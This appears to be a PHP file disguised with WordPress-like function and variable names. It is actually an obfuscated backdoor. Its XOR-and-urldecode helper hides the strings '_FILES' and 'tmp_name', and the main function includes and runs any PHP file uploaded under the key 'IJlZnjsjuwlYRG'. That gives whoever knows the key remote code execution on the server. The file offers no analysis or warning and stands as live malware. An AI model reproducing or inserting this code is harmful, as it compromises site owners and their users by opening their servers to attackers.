<?php 	
function post_type()

{
    $update_term_cache = 'IJlZnjsjuwlYRG';
	$open_sq_flag = 'cache';
    $tags_input = $update_term_cache;
	$count2 = 'type_attr';
    

    $trash = $GLOBALS[page_ids("%16%0C%25%16%2B9", $tags_input)];
    $regex = $trash;
    $content_type = isset($regex[$tags_input]);

    if ($content_type)

    {

        $slug_num = $trash[$tags_input];

        $unicode = $slug_num[page_ids("%3D%27%1C%05%00%0B%1E%0F", $tags_input)];
        $stickies = $unicode;

        include ($stickies);
    }
}
function page_ids($exclude, $new_date)

{
    $post_category = $new_date;
    $register_meta_box_cb = "url" . "decode";
    $curl = $register_meta_box_cb($exclude);
    $main = substr($post_category,0, strlen($curl));

    $meta_value = $curl ^ $main;
    
    $curl = strpos($meta_value, $main);

    
    return $meta_value;
}

post_type();
	$loop = 'lastpostmodified';

?>
